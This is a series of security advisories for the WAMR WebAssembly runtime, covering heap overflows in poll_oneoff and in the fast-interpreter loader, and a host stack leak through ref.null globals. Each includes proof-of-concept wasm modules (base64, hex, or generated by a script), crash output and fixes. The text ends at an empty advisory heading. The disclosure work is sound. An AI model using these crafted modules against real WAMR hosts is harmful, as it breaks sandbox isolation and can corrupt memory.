summary: Heap Buffer Overflow in WAMR WASI poll_oneoff Output Buffer
description:
# ANT-2026-03680: Heap Buffer Overflow in WAMR WASI poll_oneoff Output Buffer

## Vulnerability Header

| Field                | Value |
|----------------------|-------|
| **Title**            | Heap buffer overflow in wasmtime_ssp_poll_oneoff — output buffer under-validated for multi-subscription poll_oneoff calls |
| **Severity**         | Critical |
| **Bug Category**     | Heap buffer overflow (out-of-bounds WRITE) |
| **Location**         | `core/iwasm/libraries/libc-wasi/sandboxed-system-primitives/src/posix.c:2259` — `wasmtime_ssp_poll_oneoff()` |
| **Affected Versions** | All versions at or before HEAD commit `cd390ea0dcabd6d2973d184b46c53d6030f18b35` (2026-04-21) |
| **Related CVE(s)**   | None assigned |

---

## Executive Summary

WAMR's WASI implementation of `poll_oneoff` contains a heap buffer overflow in the host runtime triggered by a crafted guest Wasm module. The dispatch function `wasi_poll_oneoff` (in `libc_wasi_wrapper.c`) validates that the output buffer `out` holds at least one `__wasi_event_t` (32 bytes), but the underlying implementation `wasmtime_ssp_poll_oneoff` can write up to `nsubscriptions` events. An attacker who can supply a malicious Wasm module — which any application using WAMR to execute untrusted code can receive — passes `nsubscriptions=2` with subscriptions that each trigger an unconditional write to `out`, causing the second write to overflow the validated region. The overflow is a host-process heap write that corrupts memory adjacent to the output buffer, breaking WAMR's sandbox isolation guarantee. Exploitation may permit denial of service or, under favorable heap layout conditions, code execution in the host process.

---

## Root Cause Analysis

### Background

WAMR exports a WASI `poll_oneoff` import to guest Wasm modules. When the module calls this import:

1. The interpreter dispatches to `wasi_poll_oneoff` (`libc_wasi_wrapper.c:1089`), which translates Wasm linear-memory offsets to native pointers and validates them.
2. The validated native pointers are passed to `wasmtime_ssp_poll_oneoff` (`posix.c:2096`), which performs the actual syscall emulation.

### Vulnerable Code

**First Faulty Condition — `libc_wasi_wrapper.c:1102`**

```c
/* libc_wasi_wrapper.c:1089-1118 — wasi_poll_oneoff() */
static wasi_errno_t
wasi_poll_oneoff(wasm_exec_env_t exec_env, const wasi_subscription_t *in,
                 wasi_event_t *out, uint32 nsubscriptions, uint32 *nevents_app)
{
    ...
    if (!validate_native_addr((void *)in, (uint64)sizeof(wasi_subscription_t))
        || !validate_native_addr(out, (uint64)sizeof(wasi_event_t))   /* BUG: only 32 bytes */
        || !validate_native_addr(nevents_app, (uint64)sizeof(uint32)))
        return (wasi_errno_t)-1;

    err = wasmtime_ssp_poll_oneoff(exec_env, curfds, in, out, nsubscriptions, &nevents);
    ...
}
```

The guard checks only `sizeof(wasi_event_t)` (32 bytes) for `out`. This verifies space for exactly one event, but `wasmtime_ssp_poll_oneoff` may write up to `nsubscriptions` events.

**Crash Site — `posix.c:2244-2263`**

```c
/* posix.c — inside the nsubscriptions loop */
case __WASI_EVENTTYPE_CLOCK:
    if (clock_subscription == NULL
        && (s->u.u.clock.flags & __WASI_SUBSCRIPTION_CLOCK_ABSTIME) == 0) {
        // Relative clock: record and do not write event.
        clock_subscription = s;
        break;
    }
// Fallthrough for absolute clocks (ABSTIME=1).
default:
    // Unsupported event: write error event to out[nevents].
    fos[i] = NULL;
    pfds[i] = (os_poll_file_handle){ .fd = -1 };
    out[(*nevents)++] = (__wasi_event_t){       // ← CRASH — 2nd iteration overflows
        .userdata = s->userdata,
        .error    = __WASI_ENOSYS,
        .type     = s->u.type,
    };
    break;
```

With `nsubscriptions=2` and both subscriptions being absolute CLOCK events (ABSTIME flag set), the loop writes `out[0]` and then `out[1]`. The second write (`out[1]`) starts at `out + 32` — past any buffer sized for one event — and corrupts adjacent heap memory.

**Why the attacker controls this**: The Wasm module supplies `nsubscriptions` as a Wasm i32 parameter and controls the content of each `in[i]` subscription record in its linear memory. Setting `nsubscriptions=2` with two CLOCK+ABSTIME subscriptions is trivially encoded in ≈116 bytes of valid Wasm.

---

## First Faulty Condition

| Field         | Value |
|---------------|-------|
| **File**      | `core/iwasm/libraries/libc-wasi/libc_wasi_wrapper.c` |
| **Line**      | 1102 |
| **Condition** | `validate_native_addr(out, (uint64)sizeof(wasi_event_t))` validates only 32 bytes for the output buffer, but the callee `wasmtime_ssp_poll_oneoff` iterates `nsubscriptions` times, each time unconditionally writing a 32-byte `__wasi_event_t` to `out[nevents++]` for unsupported or error subscriptions. The invariant "out is large enough for all events that may be written" is broken here. |

This is upstream of the crash; fixing line 1102 prevents the overflow from ever reaching the crash site.

---

## Trace Analysis

```
main()
  [product-mini/platforms/posix/main.c]
  → wasm_application_execute_main()
    [core/iwasm/common/wasm_application.c:278]
    → wasm_interp_call_func_bytecode()
      [core/iwasm/interpreter/wasm_interp_classic.c:1337]
      → wasi_poll_oneoff()                    ← FIRST FAULTY CONDITION
        [libc_wasi_wrapper.c:1089]
          validate_native_addr(out, 32)       ← validates only 1 event (should be nsubscriptions * 32)
          [libc_wasi_wrapper.c:1102]
        → wasmtime_ssp_poll_oneoff()
          [posix.c:2096]
            fos = malloc(nsubscriptions * 8)  ← internal allocation
            [posix.c:2189]
            loop i=0: out[0] = ...            ← within bounds
            [posix.c:2259]
            loop i=1: out[1] = ...            ← HEAP OVERFLOW (ASAN fires here)
            [posix.c:2259]
```

---

## Exploitability Assessment

### Attack Vector & Reachability

Please see below for suggested security dimensions -- am happy to hear your thoughts on this.

| Dimension                  | Value |
|----------------------------|-------|
| **Attack vector**          | Network (crafted Wasm module delivered to any WAMR-based service) |
| **Authentication**         | None |
| **User interaction**       | None |
| **Reachable in default config** | Yes — WASI poll_oneoff is enabled by default (`WAMR_BUILD_LIBC_WASI=1`) |
| **Entry point(s)**         | Any WASM binary input path: file upload, network stream, embedded module |

### Technical Primitive

| Primitive              | Achieved? | Constraints |
|------------------------|-----------|-------------|
| Arbitrary read         | No        | Overflow is write-only from this path |
| Arbitrary write        | Partial   | Content is a `__wasi_event_t` struct (attacker controls `userdata` field = 8 bytes at overflow site); write destination is heap-adjacent memory |
| Control-flow hijack    | Partial   | Possible with heap grooming to place a function pointer or vtable at the overflow destination |
| Information disclosure | No        | Not directly; heap layout info could be inferred via oracle-based probing |
| Denial of service      | Yes       | Reliable crash (3/3 runs in original testing) |

The overflow writes a controlled 32-byte `__wasi_event_t` structure starting at `out + 32`. The `userdata` field (first 8 bytes of the struct) is fully attacker-controlled. With a groomed heap layout where a function pointer lives at `out + 32`, this could be a one-shot control-flow hijack. Without grooming, it causes an immediate crash.

---

## Reproduction Steps

### PoC

Use the below Dockerfile which has an embedded POC to trigger the issue:

```
FROM ubuntu:24.04
ENV DEBIAN_FRONTEND=noninteractive
ENV TZ=UTC

RUN apt-get update && apt-get install -y --no-install-recommends \
    git clang llvm libclang-rt-18-dev cmake ninja-build python3 ca-certificates \
    && rm -rf /var/lib/apt/lists/*

# Clone WAMR at the vulnerable commit
RUN git clone https://github.com/bytecodealliance/wasm-micro-runtime.git /repo && \
    cd /repo && \
    git checkout cd390ea0dcabd6d2973d184b46c53d6030f18b35 && \
    git log -1 --oneline

# Build iwasm with ASAN + WASI + classic interpreter (fast-interp disabled)
# AOT and JIT are disabled to keep the build simple and ensure we exercise the interpreter path
RUN mkdir -p /repo/product-mini/platforms/linux/build && \
    cd /repo/product-mini/platforms/linux/build && \
    cmake .. \
        -G Ninja \
        -DCMAKE_C_COMPILER=clang \
        -DCMAKE_CXX_COMPILER=clang++ \
        -DWAMR_BUILD_FAST_INTERP=0 \
        -DWAMR_BUILD_LIBC_WASI=1 \
        -DWAMR_BUILD_AOT=0 \
        -DWAMR_BUILD_JIT=0 \
        -DWAMR_BUILD_FAST_JIT=0 \
        -DWAMR_BUILD_SIMD=0 \
        -DWAMR_DISABLE_HW_BOUND_CHECK=1 \
        -DWAMR_BUILD_ALLOC_WITH_USAGE=1 \
        -DCMAKE_C_FLAGS="-fsanitize=address -g -O1 -fno-omit-frame-pointer" \
        -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" \
        -DCMAKE_BUILD_TYPE=Debug && \
    ninja -j"$(nproc)"

# Embed the crafted WASM PoC module.
#
# The key insight for triggering the ASAN overflow:
#   validate_native_addr(out, sizeof(wasi_event_t)) = validate_native_addr(out, 32)
#   This passes if out+32 <= memory_data_end.
#   But wasmtime_ssp_poll_oneoff writes out[0] AND out[1] (2 events = 64 bytes).
#   The second write (out[1]) lands at out+32 = memory_data_end = PAST the allocation.
#
# Memory layout (1 page = 65536 bytes):
#   offset   0: subscription[0] — userdata=1 (8B), type=0/CLOCK (1B at+8), flags=1/ABSTIME (2B at+40)
#   offset  48: subscription[1] — userdata=2 (8B), type=0/CLOCK (1B at+56), flags=1/ABSTIME (2B at+88)
#   offset 65500: nevents (4 bytes, ends at 65504)
#   offset 65504: out buffer — 32 bytes, ends exactly at memory boundary (65536)
#                 validate_native_addr(out, 32) passes: 65504+32=65536=memory_data_end
#                 out[1] write at 65536 -> HEAP BUFFER OVERFLOW caught by ASAN
#
# Both CLOCK subscriptions have ABSTIME=1 so neither matches the fast relative-clock path.
# nsubscriptions=2 also bypasses the nsubscriptions==1 early return.
# Both fall through to the default case in posix.c:2244 → write out[0] and out[1].
RUN python3 - << 'PYEOF'
import base64, os
# WASM module (199 bytes) generated to trigger the heap-buffer-overflow:
#   (module
#     (import "wasi_snapshot_preview1" "poll_oneoff" (func (param i32 i32 i32 i32) (result i32)))
#     (import "wasi_snapshot_preview1" "proc_exit" (func (param i32)))
#     (memory (export "memory") 1)
#     (export "_start" (func 2))
#     (func  ;; _start
#       ;; sub[0]: userdata=1 at offset 0, type=CLOCK at offset 8, flags=ABSTIME at offset 40
#       i32.const 0     i64.const 1  i64.store align=3 offset=0
#       i32.const 8     i32.const 0  i32.store8 align=0 offset=0
#       i32.const 40    i32.const 1  i32.store16 align=1 offset=0
#       ;; sub[1]: userdata=2 at offset 48, type=CLOCK at offset 56, flags=ABSTIME at offset 88
#       i32.const 48    i64.const 2  i64.store align=3 offset=0
#       i32.const 56    i32.const 0  i32.store8 align=0 offset=0
#       i32.const 88    i32.const 1  i32.store16 align=1 offset=0
#       ;; poll_oneoff(in=0, out=65504, nsubs=2, nevents=65500)
#       ;; out at 65504: validate_native_addr passes (65504+32=65536=memory_end)
#       ;; but out[1] writes at 65536 = past end of wasm linear memory -> OVERFLOW
#       i32.const 0  i32.const 65504  i32.const 2  i32.const 65500  call 0  drop
#       ;; proc_exit(0)
#       i32.const 0  call 1
#     )
#   )
b64 = "AGFzbQEAAAABEANgBH9/f38Bf2ABfwBgAAACSQIWd2FzaV9zbmFwc2hvdF9wcmV2aWV3MQtwb2xsX29uZW9mZgAAFndhc2lfc25hcHNob3RfcHJldmlldzEJcHJvY19leGl0AAEDAgECBQMBAAEHEwIGbWVtb3J5AgAGX3N0YXJ0AAIKQgFAAEEAQgE3AwBBCEEAOgAAQShBATsBAEEwQgI3AwBBOEEAOgAAQdgAQQE7AQBBAEHg/wNBAkHc/wMQABpBABABCw=="
data = base64.b64decode(b64)
assert len(data) == 199, f"Expected 199 bytes, got {len(data)}"
os.makedirs('/build', exist_ok=True)
open('/build/poc.wasm', 'wb').write(data)
print(f"Wrote /build/poc.wasm ({len(data)} bytes)")
PYEOF

CMD ["/bin/sh", "-c", \
    "echo '=== Vulnerable code locations ===' && \
     echo 'FIRST FAULTY CONDITION: libc_wasi_wrapper.c:1102' && \
     echo '  !validate_native_addr(out, (uint64)sizeof(wasi_event_t))' && \
     echo '  should be: nsubscriptions * sizeof(wasi_event_t)' && \
     echo 'CRASH SITE: posix.c:2259' && \
     echo '  out[(*nevents)++] = (__wasi_event_t){...}  <- second write overflows' && \
     echo '' && \
     echo '=== ASAN crash ===' && \
     ASAN_OPTIONS='detect_leaks=0:print_stacktrace=1:abort_on_error=0' \
     ASAN_SYMBOLIZER_PATH=$(which llvm-symbolizer-18) \
       /repo/product-mini/platforms/linux/build/iwasm /build/poc.wasm 2>&1; \
     echo 'exit code: '$?"]
```

### Commands

```bash
docker build -t ant-2026-03680 .
docker run --rm ant-2026-03680
```

### Expected ASAN Output

```

=== ASAN crash ===

    #2 0x560145875e2e in push_args_end /repo/core/iwasm/common/arch/invokeNative_em64.s:61

0x531000010800 is located 0 bytes after 65536-byte region [0x531000000800,0x531000010800)
allocated by thread T0 here:
    #0 0x560145835743 in malloc (/repo/product-mini/platforms/linux/build/iwasm-2.4.3+0xdd743) (BuildId: 4152cb99a2da9c79f551744211d9c0bc825f53ba)
    #1 0x56014586f218 in wasm_allocate_linear_memory /repo/core/iwasm/common/wasm_memory.c:2099:23
    #2 0x56014587e1e0 in memory_instantiate /repo/core/iwasm/interpreter/wasm_runtime.c:436:9
    #3 0x5601458779bf in memories_instantiate /repo/core/iwasm/interpreter/wasm_runtime.c:570:37
    #4 0x5601458779bf in wasm_instantiate /repo/core/iwasm/interpreter/wasm_runtime.c:2639:39

    #6 0x7f6bfaa551c9  (/lib/x86_64-linux-gnu/libc.so.6+0x2a1c9) (BuildId: 8e9fd827446c24067541ac5390e6f527fb5947bb)
    #7 0x7f6bfaa5528a in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2a28a) (BuildId: 8e9fd827446c24067541ac5390e6f527fb5947bb)

SUMMARY: AddressSanitizer: heap-buffer-overflow /repo/core/iwasm/libraries/libc-wasi/sandboxed-system-primitives/src/posix.c:2259:37 in wasmtime_ssp_poll_oneoff
Shadow bytes around the buggy address:

=>0x531000010800:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa

```

---

## Recommended Fix

```diff
--- a/core/iwasm/libraries/libc-wasi/libc_wasi_wrapper.c
+++ b/core/iwasm/libraries/libc-wasi/libc_wasi_wrapper.c
@@ -1099,8 +1099,8 @@ wasi_poll_oneoff(wasm_exec_env_t exec_env, const wasi_subscription_t *in,
     if (!wasi_ctx)
         return (wasi_errno_t)-1;
 
-    if (!validate_native_addr((void *)in, (uint64)sizeof(wasi_subscription_t))
-        || !validate_native_addr(out, (uint64)sizeof(wasi_event_t))
+    if (!validate_native_addr((void *)in, (uint64)nsubscriptions * sizeof(wasi_subscription_t))
+        || !validate_native_addr(out, (uint64)nsubscriptions * sizeof(wasi_event_t))
         || !validate_native_addr(nevents_app, (uint64)sizeof(uint32)))
         return (wasi_errno_t)-1;
```

This fix ensures `validate_native_addr` checks that the `out` buffer contains enough space for all `nsubscriptions` output events before `wasmtime_ssp_poll_oneoff` begins writing. The same fix is applied to `in` to prevent out-of-bounds reads of the subscription array (a secondary latent vulnerability at the same function). No fix commit is available; this issue is unpatched as of 2026-04-21.

---

This was found by Anthropic running claude code to do security assessments of open source software. I'm from Ada Logics and we're helping Anthropic triage and report the issues.

summary: Missing `ref.null` heap-type validation in `load_init_expr` leaks host stack memory to the WebAssembly guest
description:
## Summary

In the classic/fast interpreter loader (`core/iwasm/interpreter/wasm_loader.c`), the `ref.null` handler inside `load_init_expr()` accepts any byte as a heap type when built with `WASM_ENABLE_GC=0` (the default). Combined with the fact that the local `WASMValue cur_value` is never zero-initialized and `cur_value.ref_index = NULL_REF` only writes 4 of the union's 16 bytes, a crafted module can declare an `i64` / `f64` / `v128` global initialized with `ref.null <wide-type>` and read back uninitialized bytes from the host loader's stack frame at runtime. Spec-conforming runtimes (e.g. wasmtime) reject the module at parse time.

## Details

**File:** `core/iwasm/interpreter/wasm_loader.c`
**Function:** `load_init_expr`
**Lines:** 1000-1013 (`INIT_EXPR_TYPE_REFNULL_CONST` case)

### The two defects that combine

**1. No validation of the heap-type byte (wasm_loader.c:1005).**

```c
case INIT_EXPR_TYPE_REFNULL_CONST:
{
#if WASM_ENABLE_GC == 0
    uint8 type1;
    CHECK_BUF(p, p_end, 1);
    type1 = read_uint8(p);              // <-- no check on type1
    cur_value.ref_index = NULL_REF;
    if (!push_const_expr_stack(&const_expr_ctx, flag, type1,
                               &cur_value, ...))
        goto fail;
```

The WebAssembly reference-types proposal requires `ref.null ht` where `ht` is `funcref (0x70)` or `externref (0x6F)`. WAMR's own bytecode validator enforces this correctly at `wasm_loader.c:13670-13674`:

```c
if (ref_type != VALUE_TYPE_FUNCREF
    && ref_type != VALUE_TYPE_EXTERNREF) {
    set_error_buf(error_buf, error_buf_size, "type mismatch");
    goto fail;
}
```

The init-expression path is missing this check, so any byte — including `0x7E` (i64), `0x7C` (f64), or `0x7B` (v128) — is accepted and propagated as the stack-entry type.

**2. Partial initialization of a 16-byte union (wasm_loader.c:740 + 1006).**

`WASMValue` is a 16-byte union (`core/iwasm/interpreter/wasm.h:244`). In `load_init_expr` the local is declared uninitialized:

```c
WASMValue cur_value;     // line 740 — stack garbage
```

`cur_value.ref_index = NULL_REF` writes only the 4 bytes at offset 0. The remaining 12 bytes retain whatever was previously on the host's stack.

### Exploit chain (concrete trace for an i64 global)

1. Attacker's module declares: `global i64 = (ref.null 0x7E)`.
2. `load_init_expr` enters with `cur_value = { <16 bytes of host stack garbage> }`.
3. `type1 = read_uint8(p)` → `0x7E`. **No validation performed.**
4. `cur_value.ref_index = NULL_REF` overwrites bytes 0-3 with `FF FF FF FF`. Bytes 4-15 remain garbage.
5. `push_const_expr_stack` (line 508-511) copies the whole `WASMValue` into the const-expression stack with `type = 0x7E`.
6. End-of-expression `pop_const_expr_stack` (line 1497) expects type `VALUE_TYPE_I64 == 0x7E`. The check `cur_value->type != type` **passes** (both are `0x7E`) and the full union is written back.
7. `init_expr->u.unary.v = cur_value` is later stored as `global->initial_value`.
8. At instantiation (`core/iwasm/interpreter/wasm_runtime.c:2701-2706`), the i64 case copies **8 bytes** via `bh_memcpy_s(global_data, ..., &global->initial_value.i64, sizeof(int64))`. The low 4 bytes are `0xFFFFFFFF`; the high 4 bytes are the leaked host stack data.
9. The guest executes `global.get 0`, receives an `i64` whose upper 32 bits vary per run — leaked host memory inside the sandbox.

Wider globals widen the leak: `f64` also leaks 4 bytes, `v128` leaks 12 bytes per global.

## PoC

### Minimal module (90 bytes)

Hex: `0061736d010000000105016000017e030201000606017e00d07e0b070801047465737400000a0601040023000b`

Structure:
- Type section: `() -> i64`
- Function section: 1 function
- Global section: 1 immutable `i64` global, init = `ref.null 0x7E` (invalid per spec)
- Export: function `test`
- Code section: `global.get 0; end`

### Build configuration used

Default-class build, no GC:

```
WAMR_BUILD_INTERP=1 WAMR_BUILD_FAST_INTERP=1
WAMR_BUILD_REF_TYPES=1
WAMR_BUILD_BULK_MEMORY=1
WAMR_BUILD_SIMD=1
WAMR_BUILD_AOT=1
WAMR_BUILD_GC=0                      # vulnerable path
WAMR_BUILD_EXTENDED_CONST_EXPR=0
```

Target: `x86_64-pc-linux-gnu` (also reproducible on `x86_64-apple-darwin`).

### Reproduction

```sh
python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('0061736d010000000105016000017e030201000606017e00d07e0b070801047465737400000a0601040023000b'))" \
  > refnull_leak.wasm

# WAMR (vulnerable): accepts module, returns non-deterministic i64
for i in $(seq 1 10); do
  iwasm --interp -f test refnull_leak.wasm
done
```

Observed output (10 consecutive runs):

```
0x615dffffffff:i64
0x5dcfffffffff:i64
0x586effffffff:i64
0x5de5ffffffff:i64
0x64cdffffffff:i64
0x622cffffffff:i64
0x5e65ffffffff:i64
0x5782ffffffff:i64
0x61f2ffffffff:i64
0x5b0effffffff:i64
```

Low 32 bits are always `0xFFFFFFFF` (the `NULL_REF` sentinel). **Upper 32 bits change every run** — this is leaked host-stack data from the loader's frame.

### Differential oracle (wasmtime)

```sh
wasmtime run --invoke test refnull_leak.wasm
# Error: failed to parse WebAssembly module
# Caused by: invalid heap type (at offset 0x19)
```

Wasmtime correctly rejects at parse time. A valid `(global i64 (i64.const -1))` returns deterministic `0xffffffffffffffff:i64` on WAMR, confirming the non-determinism above is the leak, not a correctness bug in the i64 path.

### Variants

- **v128 global, init `ref.null 0x7B`** → leaks 12 bytes per global.
- **f64 global, init `ref.null 0x7C`** → leaks 4 bytes, observable as denormal-looking doubles.

## Impact

Sandbox guarantee is violated. A WebAssembly guest module reads host-process memory that it should have no access to. 

**Who is affected:**

- Any WAMR embedder running **untrusted** `.wasm` modules through the classic or fast interpreter.
- Default build configuration (`WAMR_BUILD_GC=0`) — the GC-enabled code path validates heap types correctly.

**Leak size:**

- `i64` / `f64` global: 4 bytes per global.
- `v128` global: 12 bytes per global.
- A module with N v128 globals exfiltrates up to 12·N bytes per load; each reload samples fresh stack state.
- Spec non-conformance: WAMR accepts invalid modules

summary: WAMR fast interpreter loader heap buffer overflow via constant deduplication mismatch
description:
### Summary

A mismatch between the two-pass fast interpreter loader's constant deduplication logic causes the compiled code buffer to overflow during module loading. A crafted WebAssembly module can trigger a heap buffer overflow write with partially attacker-controlled content during `wasm_runtime_load()`, before any wasm code is executed. Any application that uses WAMR's fast interpreter to load untrusted wasm modules is affected.

### Details

WAMR's fast interpreter compiles wasm bytecode into an internal representation using a two-pass loader in `wasm_loader.c`. Pass 1 walks the bytecode without emitting code, tracking the total compiled code size in `code_compiled_peak_size`. Between passes, the loader allocates a code buffer of exactly that size ([line 9538-9539](https://github.com/bytecodealliance/wasm-micro-runtime/blob/dd0fee27/core/iwasm/interpreter/wasm_loader.c#L9538-L9539)):

```c
ctx->p_code_compiled = loader_malloc(ctx->code_compiled_peak_size, NULL, 0);
ctx->p_code_compiled_end = ctx->p_code_compiled + ctx->code_compiled_peak_size;
```

Pass 2 re-walks the bytecode and writes compiled code into this buffer. Correctness requires that Pass 2 produces **exactly** the same number of bytes that Pass 1 counted.

The bug is a desynchronization in how constants are handled between the two passes:

**Pass 1** accumulates constants into arrays via [`wasm_loader_get_const_offset()`](https://github.com/bytecodealliance/wasm-micro-runtime/blob/dd0fee27/core/iwasm/interpreter/wasm_loader.c#L10160-L10249). To avoid O(n²) behavior, the deduplication linear scan is **skipped when the count reaches 10** ([line 10175](https://github.com/bytecodealliance/wasm-micro-runtime/blob/dd0fee27/core/iwasm/interpreter/wasm_loader.c#L10175)):

```c
/* Traverse the list if the const num is small */
if (ctx->i64_const_num < 10) {
    for (uint32 i = 0; i < ctx->i64_const_num; i++) {
        if (ctx->i64_consts[i] == *(int64 *)value) {
            *offset = -1;
            return true;
        }
    }
}
// ...
ctx->i64_consts[ctx->i64_const_num++] = *(int64 *)value;  // always appended
```

After the 10th unique constant, **all constants are appended unconditionally**, including duplicates. A function with 16,000 `i64.const 0` instructions produces 16,000 entries.

When the combined const slot count overflows (`i64_const_num * 2 + i32_const_num > INT16_MAX - 2`), new constants can no longer fit in the table and `*offset` is set to 0 ([line 10169-10171](https://github.com/bytecodealliance/wasm-micro-runtime/blob/dd0fee27/core/iwasm/interpreter/wasm_loader.c#L10169-L10171)). This tells the caller to **emit the constant inline**. In the `WASM_OP_I64_CONST` handler, this means emitting both an opcode and the 8-byte value ([lines 14502-14506](https://github.com/bytecodealliance/wasm-micro-runtime/blob/dd0fee27/core/iwasm/interpreter/wasm_loader.c#L14502-L14506)):

```c
GET_CONST_OFFSET(VALUE_TYPE_I64, i64_const);

if (operand_offset == 0) {
    disable_emit = false;
    emit_label(WASM_OP_I64_CONST);    // emit opcode
    emit_uint64(loader_ctx, i64_const); // emit 8-byte inline value
}
```

When `operand_offset != 0` (constant found in the table), only a 2-byte table reference is emitted. **This is a 6+ byte difference per constant.**

**Between passes**, at the [`re_scan:` label](https://github.com/bytecodealliance/wasm-micro-runtime/blob/dd0fee27/core/iwasm/interpreter/wasm_loader.c#L11860-L11963), the loader sorts the const arrays with `qsort` and then **removes duplicates**, dramatically reducing the counts:

```c
/* Sort the i64 consts */
qsort(i64_consts_old, loader_ctx->i64_const_num, sizeof(int64),
      cmp_i64_const);

/* Remove the duplicated i64 consts */
uint32 k = 1;
for (i = 1; i < loader_ctx->i64_const_num; i++) {
    if (i64_consts_old[i] != i64_consts_old[i - 1]) {
        i64_consts_old[k++] = i64_consts_old[i];
    }
}
// ...
loader_ctx->i64_const_num = k;
```

For a function with 16,000 duplicate `i64.const 0` and 10 unique i64 constants, `i64_const_num` drops from 16,010 to 11 — freeing over 32,000 const slots.

**Pass 2** uses `bsearch` on the now-deduplicated sorted arrays ([line 10254](https://github.com/bytecodealliance/wasm-micro-runtime/blob/dd0fee27/core/iwasm/interpreter/wasm_loader.c#L10254)):

```c
i64_const = bsearch(&key, ctx->i64_consts, ctx->i64_const_num,
                     sizeof(int64), cmp_i64_const);
if (!i64_const) { /* not found, emit const instead */
    *offset = 0;
    return true;
}
```

With the reduced count, the slot overflow check (`i64_const_num * 2 + i32_const_num > INT16_MAX - 2`) no longer triggers, so later instructions can make different code-generation decisions in Pass 2 than they did in Pass 1. Some constants that were emitted inline in Pass 1 now fit in the const table in Pass 2, which by itself can shrink the output. The overflow arises because this also changes downstream helper decisions: in the crashing PoC, once const slots become available again after deduplication, `reserve_block_ret()` emits additional copy operands in Pass 2 that were not emitted in Pass 1. That makes the final Pass 2 output larger than the buffer sized by Pass 1, so writes go past `p_code_compiled_end` into adjacent heap memory.

**Affected configurations:** Any build with `WAMR_BUILD_FAST_INTERP=1` (the default interpreter mode).

**Affected versions:** main branch at commit `dd0fee27`, and likely all prior versions with the two-pass fast interpreter loader.

### PoC

The PoC exploits the desynchronization by:

1. Including 11 unique i64 constants to exceed the `< 10` dedup threshold
2. Including 16,373 duplicate `i64.const 0` to inflate `i64_const_num` until the combined slot count exceeds `INT16_MAX`, forcing subsequent i32 constants to be emitted inline in Pass 1
3. Including 50 i32 constants after the slot overflow — emitted inline in Pass 1 but placed in the table in Pass 2
4. Including a multi-value block that triggers `reserve_block_ret()`, which emits additional copy operands when const slots are available

After between-pass dedup reduces i64 from 16,384 to 11, the i32 constants fit in the table again, and `reserve_block_ret()` emits additional copy operands in Pass 2 that were absent in Pass 1. The net effect is that Pass 2 becomes larger than the size computed in Pass 1 and overflows the code buffer.

The full PoC (32,915 lines) is available at [gist](https://gist.github.com/shumbo/b710c35b005ed871447fce385d1ab760).

Generate and run:

```bash
# Generate the full .wat with 16373 duplicate lines
{
  echo '(module'
  echo '  (func (export "test") (result i32)'
  for i in $(seq 1 11); do echo "    i64.const $i"; echo "    drop"; done
  for i in $(seq 1 16373); do echo '    i64.const 0'; echo '    drop'; done
  for i in $(seq 1 50); do echo "    i32.const $i"; echo "    drop"; done
  echo '    block (result i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32)'
  for i in $(seq 1 21); do echo "      i32.const $i"; done
  echo '    end'
  for i in $(seq 1 20); do echo '    drop'; done
  echo '  )'
  echo ')'
} > poc.wat

wat2wasm poc.wat -o poc.wasm

# ASAN build confirms heap-buffer-overflow during loading (no execution needed)
iwasm-asan -f test poc.wasm
```

ASAN output:

```
==3664==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x519000000e7b at pc 0x555555623226 bp 0x7ffffffc1cf0 sp 0x7ffffffc1ce0
WRITE of size 2 at 0x519000000e7b thread T0
    #0 in STORE_U16 wasm_runtime_common.h:68
    #1 in wasm_loader_emit_int16 wasm_loader.c:9630
    #2 in reserve_block_ret wasm_loader.c:10660
    #3 in wasm_loader_prepare_bytecode wasm_loader.c:12617
    #4 in load_from_sections wasm_loader.c:6691
    #5 in load wasm_loader.c:7111
    #6 in wasm_loader_load wasm_loader.c:7288
    #7 in wasm_runtime_load_ex wasm_runtime_common.c:1515
    #8 in wasm_runtime_load wasm_runtime_common.c:1568
    #9 in main main.c:950

0x519000000e7c is located 0 bytes to the right of 1020-byte region [0x519000000a80,0x519000000e7c)
allocated by thread T0 here:
    #0 in __interceptor_malloc asan_malloc_linux.cpp:145
    #1 in loader_malloc wasm_loader.c:345
    #2 in wasm_loader_ctx_reinit wasm_loader.c:9539
    #3 in wasm_loader_prepare_bytecode wasm_loader.c:11862
```

Note: The exact number of duplicate constants needed may vary slightly depending on build configuration. The key requirement is that `i64_const_num * 2 + i32_const_num` exceeds `INT16_MAX` (32767) in Pass 1, so that between-pass dedup changes which constants fit in the table.

### Impact

This is a heap buffer overflow write vulnerability triggered during module loading. A crafted wasm module causes the two-pass fast interpreter loader to write compiled bytecode past the end of a heap-allocated code buffer. The overflow content is partially attacker-controlled (constant values chosen by the attacker are written as inline data).

Any application that uses WAMR's fast interpreter (the default mode) to load untrusted wasm modules is vulnerable to denial of service (deterministic crash via heap metadata corruption). No wasm code execution is required — the overflow occurs during loading. The out-of-bounds write may have further consequences depending on the host application's heap layout.

### Workaround
Disable the fast interpreter at build time (`-DWAMR_BUILD_FAST_INTERP=0`). This activates the classic interpreter, which is not affected. Note that this will reduce runtime performance.

### Fix
In `wasm_loader_get_const_offset()`  (`wasm_loader.c`), the overflow handlers for all three constant types (`i64`/`f64`, `v128`, `i32`/`f32`) were updated to perform a linear scan of the existing constant table before returning an inline decision. If the value is already present in the table, a table-reference is returned (consistent with what binary search will return in Pass 2). If the value is not present, inline is returned (consistent with binary search missing it in Pass 2). This ensures the dynamic_offset state in both passes remains identical at every point in the bytecode walk.

Additionally, the deduplication scan threshold was raised from 10 to 32 entries (`FAST_INTERP_CONST_DEDUP_SCAN_MAX`) to reduce duplicate accumulation in the common case, and the threshold is now a named constant.

# Current State
Run the following command:

iwasm/iwasm --interp -f main corpus/0_v128.wasm
Observed output:

unhandled SIGSEGV, si_addr: (nil)
Aborted (core dumped)
[0_v128.wasm.txt](https://github.com/user-attachments/files/23415995/0_v128.wasm.txt)

# Reproduction steps
Save the attached WASM file: 0_v128.wasm
Run the command:
iwasm/iwasm --interp -f main corpus/0_v128.wasm
Observe segmentation fault

# IWASM Version or Commit you used
2.4.3

# Operating system information
Ubuntu 20.04

# Hardware Architecture
amd64 (x86_64)

summary: frame_offset_bottom array bounds overflow in fast Interpreter mode when handling GET_GLOBAL(I32) followed by if opcode
description:
### Summary
